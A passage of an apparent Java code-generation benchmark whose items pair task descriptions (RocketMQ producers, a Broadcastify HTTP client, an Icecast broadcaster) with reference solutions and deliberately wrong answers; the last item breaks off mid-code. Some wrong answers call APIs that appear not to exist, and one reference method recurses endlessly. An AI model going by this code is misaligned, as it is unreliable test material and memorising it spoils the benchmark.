    "Instruction": "Task Description: Create a Java function that demonstrates how to use RocketMQ's producer to send messages to a specified topic with ACL authentication.\n\nFunction Description: This function creates and configures a RocketMQ producer with ACL authentication, sends multiple messages to a specified topic, and then shuts down the producer. It demonstrates the basic workflow of message production including producer initialization, message creation, message sending, and resource cleanup.\n\nInput: None (The function uses predefined constants for configuration)\n\nOutput: None (The function prints send results to console but doesn't return any value)\n\nMethods:\n\nproducer: producer() -> void - Main function that creates and configures the producer, sends messages, and handles shutdown\ngetAclRPCHook: getAclRPCHook() -> RPCHook - Helper function that creates and returns an ACL authentication hook using predefined credentials",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.acl.common.AclClientRPCHook;\nimport org.apache.rocketmq.acl.common.SessionCredentials;\nimport org.apache.rocketmq.remoting.RPCHook;\n\nprivate static final String ACL_ACCESS_KEY = \"RocketMQ\";\nprivate static final String ACL_SECRET_KEY = \"1234567\";\n\npublic static void producer() throws MQClientException {\n    DefaultMQProducer producer = new DefaultMQProducer(\"ProducerGroupName\", getAclRPCHook());\n    producer.setNamesrvAddr(\"127.0.0.1:9876\");\n    producer.start();\n\n    for (int i = 0; i < 128; i++)\n        try {\n            {\n                Message msg = new Message(\"TopicTest\",\n                    \"TagA\",\n                    \"OrderID188\",\n                    \"Hello world\".getBytes(RemotingHelper.DEFAULT_CHARSET));\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"%s%n\", sendResult);\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    producer.shutdown();\n}\n\nstatic RPCHook getAclRPCHook() {\n    return new AclClientRPCHook(new SessionCredentials(ACL_ACCESS_KEY,ACL_SECRET_KEY));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 42,
    "wrong_result": "```java\npublic class RocketMQProducer {\n    private static final String PRODUCER_GROUP = \"test_producer_group\";\n    private static final String ROCKETMQ_NAMESRV_ADDR = \"localhost:9876\";\n    private static final String TOPIC = \"test_topic\";\n    private static final String ACCESS_KEY = \"your_access_key\";\n    private static final String SECRET_KEY = \"your_secret_key\";\n\n    public void producer() {\n        DefaultMQProducer producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(ROCKETMQ_NAMESRV_ADDR);\n        producer.setRPCHook(getAclRPCHook());\n\n        try {\n            producer.start();\n            for (int i = 0; i < 10; i++) {\n                Message msg = new Message(TOPIC, \"TagA\", (\"Hello RocketMQ \" + i).getBytes());\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"SendResult: %s%n\", sendResult);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            producer.shutdown();\n        }\n    }\n\n    private RPCHook getAclRPCHook() {\n        return new AclRPCHook(new SessionCredentials(ACCESS_KEY, SECRET_KEY));\n    }\n\n    public static void main(String[] args) {\n        new RocketMQProducer().producer();\n    }\n}\n```"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with configurable group, tags, and keys.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending, and shutdown operations. The class provides methods to start the producer, send messages synchronously, and gracefully shut down the producer.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- group: String - The producer group name\n- topic: String - The topic to which messages will be sent\n- tags: String - The tags for message categorization\n- keys: String - The keys for message identification\n\nMethods:\n- Producer(String group, String topic, String tags, String keys) -> void - Constructor that initializes the producer with given group, topic, tags, and keys\n- start() -> void - Starts the producer instance\n- sendMessage(String messageContent) -> SendResult - Synchronously sends a message with the given content and returns the send result\n- shutdown() -> void - Shuts down the producer instance\n- buildCommandline(String[] args) -> CommandLine - Static method that builds and parses command line arguments for producer configuration",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.HelpFormatter;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.commons.cli.ParseException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) throws MQClientException {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n        this.producer.setInstanceName(Long.toString(System.currentTimeMillis()));\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws Exception {\n        Message msg = new Message(\n            topic,\n            tags,\n            keys,\n            messageContent.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        final Options options = new Options();\n        Option opt = new Option(\"h\", \"help\", false, \"Print help\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"g\", \"producerGroup\", true, \"Producer Group Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Topic Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"a\", \"tags\", true, \"Tags Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"k\", \"keys\", true, \"Keys Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"c\", \"msgCount\", true, \"Message Count\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        DefaultParser parser = new DefaultParser();\n        HelpFormatter hf = new HelpFormatter();\n        hf.setWidth(110);\n        CommandLine commandLine = null;\n        try {\n            commandLine = parser.parse(options, args);\n            if (commandLine.hasOption('h')) {\n                hf.printHelp(\"producer\", options, true);\n                return null;\n            }\n        } catch (ParseException e) {\n            hf.printHelp(\"producer\", options, true);\n            return null;\n        }\n\n        return commandLine;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.commons.cli.*;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags, keys.getBytes(), messageContent.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        Options options = new Options();\n        Option groupOpt = new Option(\"g\", \"group\", true, \"Producer group name\");\n        Option topicOpt = new Option(\"t\", \"topic\", true, \"Topic to send messages to\");\n        Option tagsOpt = new Option(\"a\", \"tags\", true, \"Tags for message categorization\");\n        Option keysOpt = new Option(\"k\", \"keys\", true, \"Keys for message identification\");\n        options.addOption(groupOpt);\n        options.addOption(topicOpt);\n        options.addOption(tagsOpt);\n        options.addOption(keysOpt);\n\n        CommandLineParser parser = new DefaultParser();\n        HelpFormatter formatter = new HelpFormatter();\n        CommandLine cmd = null;\n\n        try {\n            cmd = parser.parse(options, args);\n        } catch (ParseException e) {\n            System.out.println(e.getMessage());\n            formatter.printHelp(\"Producer\", options);\n            System.exit(1);\n        }\n\n        return cmd;\n    }\n}\n```"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making synchronous and asynchronous HTTP requests, specifically designed for interacting with the Broadcastify API.\n\nClass Description: The BroadcastifyHttpClient class provides methods for testing API connections and sending asynchronous requests to the Broadcastify service. It uses Java's HttpClient for HTTP/2 communication with configurable timeout and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection](BroadcastifyCallConfiguration configuration) -> String - Tests the connection to the Broadcastify API by sending a synchronous multipart/form-data POST request with API key, system ID, and test flag. Returns the response body with status code or error message.\n- sendAsyncRequest: [sendAsyncRequest](HttpRequest request) -> void - Sends an HTTP request asynchronously and handles the response or error in a completion callback. Successful responses (status 200) and errors are handled separately.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class BroadcastifyHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) {\n        BroadcastifyCallBuilder bodyBuilder = new BroadcastifyCallBuilder();\n        bodyBuilder.addPart(FormField.API_KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM_ID, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((response, throwable) -> {\n                if(throwable != null || response.statusCode() != 200) {\n                    if(!(throwable instanceof IOException || throwable instanceof CompletionException)) {\n                        // Handle non-I/O errors\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class BroadcastifyHttpClient {\n    private final HttpClient mHttpClient;\n\n    public BroadcastifyHttpClient() {\n        this.mHttpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .connectTimeout(Duration.ofSeconds(20))\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .build();\n    }\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) {\n        try {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(\"https://api.broadcastify.com/v1/test\"))\n                    .header(\"Content-Type\", \"multipart/form-data\")\n                    .POST(HttpRequest.BodyPublishers.ofString(\"api_key=\" + configuration.apiKey() + \"&system_id=\" + configuration.systemId() + \"&test=true\"))\n                    .build();\n\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            return \"Status: \" + response.statusCode() + \", Response: \" + response.body();\n        } catch (Exception e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenApply(response -> {\n                    if (response.statusCode() == 200) {\n                        System.out.println(\"Success: \" + response.body());\n                    } else {\n                        System.out.println(\"Error: Status \" + response.statusCode() + \", \" + response.body());\n                    }\n                    return response;\n                })\n                .exceptionally(ex -> {\n                    System.err.println(\"Exception: \" + ex.getMessage());\n                    return null;\n                });\n    }\n}"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic, querying messages, and managing the producer lifecycle.\n\nClass Description: The TestProducer class provides functionality to initialize, start, and manage a RocketMQ producer instance. It can send messages to a specified topic with tags and keys, query messages based on criteria, and properly shut down the producer when no longer needed.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages and performing message-related operations.\n\nMethods:\n- TestProducer(String namesrvAddr, String producerGroup) -> void - Constructor that initializes the producer with the specified NameServer address and producer group.\n- start() -> void - Starts the producer instance to begin sending messages.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Sends a message to the specified topic with given tags, keys, and body. Returns the send result.\n- queryMessage(String topic, String key, int maxNum, long begin, long end) -> QueryResult - Queries messages for the specified topic based on key, maximum number of messages, and time range. Returns the query result.\n- shutdown() -> void - Shuts down the producer instance gracefully.",
    "Canonical_solution": "import org.apache.rocketmq.client.QueryResult;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class TestProducer {\n\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws Exception {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class TestProducer {\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        try {\n            producer.start();\n        } catch (MQClientException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) {\n        try {\n            Message msg = new Message(topic, tags, keys.getBytes(), body.getBytes());\n            return producer.send(msg);\n        } catch (MQClientException | InterruptedException | RemotingException | MQBrokerException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) {\n        try {\n            MessageQueue mq = new MessageQueue(topic, \"brokerName\", 0);\n            return producer.queryMessageByKey(mq, key, maxNum, begin, end);\n        } catch (MQClientException | InterruptedException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Create a Java class that serves as a template for interacting with RocketMQ producers, providing various methods to send messages (including ordered messages) with configurable parameters.\n\nClass Description: The RocketMQTemplate class is a utility class that simplifies interaction with RocketMQ producers. It manages producer instances, provides default configurations, and offers multiple methods for sending messages with different levels of customization. The class handles both regular and ordered message sending, with configurable timeouts, queue numbers, and producer groups.\n\nAttributes:\n- log: [InternalLogger] - Logger instance for error and debug logging\n- DEFAULT_PRODUCER_GROUP: [String] - Default producer group name\n- DEFAULT_QUEUE_NUM: [int] - Default number of queues\n- DEFAULT_SEND_MSG_TIMEOUT: [int] - Default message sending timeout in milliseconds\n- producerMap: [Map<String, DefaultMQProducer>] - Map storing producer instances with their configuration keys\n\nMethods:\n- getProducer() -> [DefaultMQProducer] - Gets a producer with default settings\n- getProducer([int queueNum]) -> [DefaultMQProducer] - Gets a producer with custom queue number\n- getProducer([String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a producer with custom group and timeout\n- getProducer([int queueNum, String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a fully customized producer\n- send([String topic, String body]) -> [SendResult] - Sends a message with default settings\n- send([String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom timeout\n- send([String producerGroup, String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom group and timeout\n- send([String producerGroup, String topic, String tags, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags\n- send([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags and keys\n- send([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending messages\n- sendOrderly([String producerGroup, String topic, String keys, String body]) -> [SendResult] - Sends ordered message with default timeout\n- sendOrderly([String producerGroup, String topic, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with custom timeout\n- sendOrderly([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with tags\n- sendOrderly([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending ordered messages",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.math.NumberUtils;\nimport org.apache.rocketmq.client.log.ClientLogger;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.InternalLogger;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n\n    private static final InternalLogger log = ClientLogger.getLog();\n\n    private static final String DEFAULT_PRODUCER_GROUP = \"default-producer\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n\n    private static Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public static DefaultMQProducer getProducer() throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum) throws Exception {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) throws Exception {\n        if (queueNum < 1) throw new IllegalArgumentException(\"queueNum must >= 1\");\n        if (StringUtils.isBlank(producerGroup)) throw new IllegalArgumentException(\"producerGroup cannot be null\");\n        String producerKey = producerGroup + queueNum;\n        if (producerMap.get(producerKey) == null) {\n            synchronized (producerMap) {\n                if (producerMap.get(producerKey) == null) {\n                    DefaultMQProducer producer = new DefaultMQProducer(DEFAULT_PRODUCER_GROUP);\n                    producer.setDefaultTopicQueueNums(queueNum);\n                    producer.setSendMsgTimeout(sendMsgTimeout);\n                    producer.start();\n                    producerMap.put(producerKey, producer);\n                }\n            }\n        }\n        return producerMap.get(producerKey);\n    }\n\n    public static SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return send(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult send(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, keys, body, sendMsgTimeout);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return sendOrderly(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message,\n                new MessageQueueSelector() {\n                    @Override\n                    public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                        long id = NumberUtils.toLong(String.valueOf(arg));\n                        int index = (int) (id % mqs.size());\n                        return mqs.get(index);\n                    }\n                }, message.getKeys());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class RocketMQTemplate {\n    private static final InternalLogger log = InternalLoggerFactory.getLogger(RocketMQTemplate.class);\n    private static final String DEFAULT_PRODUCER_GROUP = \"DEFAULT_PRODUCER_GROUP\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n    private final Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public DefaultMQProducer getProducer() {\n        return getProducer(DEFAULT_QUEUE_NUM);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum) {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) {\n        String key = producerGroup + \"_\" + queueNum + \"_\" + sendMsgTimeout;\n        if (!producerMap.containsKey(key)) {\n            DefaultMQProducer producer = new DefaultMQProducer(producerGroup);\n            producer.setSendMsgTimeout(sendMsgTimeout);\n            producer.setRetryTimesWhenSendFailed(2);\n            producer.setQueueSelector(new AllocateMessageQueueAveragely());\n            producer.setTopicPublishInfoTable(new HashMap<>());\n            producer.start();\n            producerMap.put(key, producer);\n        }\n        return producerMap.get(key);\n    }\n\n    public SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, null, null, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        Message message = new Message(topic, tags, keys, body.getBytes());\n        return send(producerGroup, message, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, Message message, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n        try {\n            return producer.send(message);\n        } catch (Exception e) {\n            log.error(\"Failed to send message\", e);\n            throw new RuntimeException(\"Failed to send message\", e);\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, null, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, null, keys, body, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        Message message = new Message(topic, tags, keys, body.getBytes());\n        return sendOrderly(producerGroup, message, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n        try {\n            return producer.send(message, new MessageQueueSelector() {\n                @Override\n                public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                    Integer id = (Integer) arg;\n                    int index = id % mqs.size();\n                    return mqs.get(index);\n                }\n            }, keys);\n        } catch (Exception e) {\n            log.error(\"Failed to send ordered message\", e);\n            throw new RuntimeException(\"Failed to send ordered message\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 397,
    "Instruction": "Task Description: Create a Java class that implements an Icecast HTTP audio broadcaster using Apache MINA for TCP client communication. The class should handle connection management, session handling, and error states for streaming audio to an Icecast server.\n\nClass Description: The IcecastHTTPAudioBroadcaster class manages the connection and streaming of audio data to an Icecast server using HTTP over TCP. It handles connection states, authentication, and error recovery while maintaining a persistent session with the server.\n\nAttributes:\n- mLog: Logger - Logger instance for logging events and errors\n- RECONNECT_INTERVAL_MILLISECONDS: long - Time interval between connection attempts (30 seconds)\n- mSocketConnector: NioSocketConnector - MINA socket connector for TCP communication\n- mStreamingSession: IoSession - Current active streaming session\n- mConnecting: AtomicBoolean - Flag indicating if a connection attempt is in progress\n- mLastConnectionAttempt: long - Timestamp of last connection attempt\n\nMethods:\n- IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) -> void - Constructor that initializes the broadcaster with configuration\n- connect() -> boolean - Attempts to establish a connection to the Icecast server, returns true if successful\n- disconnect() -> void - Closes the current streaming session and cleans up resources\n- connected() -> boolean - Returns true if currently connected to the server\n- canConnect() -> boolean - Returns true if conditions allow for a connection attempt\n- getBroadcastConfiguration() -> IcecastHTTPConfiguration - Returns the current broadcast configuration\n- setBroadcastState(BroadcastState state) -> void - Updates the current broadcast state\n- getBroadcastState() -> BroadcastState - Returns the current broadcast state\n- getHTTPHeaders() -> Map<String,String> - Returns HTTP headers for the connection\n- getConfiguration() -> IcecastHTTPConfiguration - Returns the configuration object\n\nInner Class:\n- IcecastHTTPIOHandler extends IoHandlerAdapter - Handles MINA session events\n  Methods:\n  - sessionOpened(IoSession session) -> void - Sends HTTP PUT request when session opens\n  - sessionClosed(IoSession session) -> void - Handles session cleanup when closed\n  - exceptionCaught(IoSession session, Throwable throwable) -> void - Handles connection exceptions\n  - messageReceived(IoSession session, Object object) -> void - Processes server responses",
    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.BroadcastState;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastHTTPConfiguration;\nimport org.apache.mina.core.RuntimeIoException;\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.future.ConnectFuture;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolDecoderException;\nimport org.apache.mina.http.HttpClientCodec;\nimport org.apache.mina.http.HttpRequestImpl;\nimport org.apache.mina.http.api.DefaultHttpResponse;\nimport org.apache.mina.http.api.HttpMethod;\nimport org.apache.mina.http.api.HttpVersion;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IcecastHTTPAudioBroadcaster {\n\n    private static final Logger mLog = LoggerFactory.getLogger(IcecastHTTPAudioBroadcaster.class);\n    private static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n\n    private NioSocketConnector mSocketConnector;\n    private IoSession mStreamingSession = null;\n    private AtomicBoolean mConnecting = new AtomicBoolean();\n    private long mLastConnectionAttempt = 0;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        // Constructor logic\n    }\n\n    private boolean connect() {\n        if(!connected() && canConnect() &&\n            (mLastConnectionAttempt + RECONNECT_INTERVAL_MILLISECONDS < System.currentTimeMillis()) &&\n            mConnecting.compareAndSet(false, true))\n        {\n            mLastConnectionAttempt = System.currentTimeMillis();\n\n            if(mSocketConnector == null) {\n                mSocketConnector = new 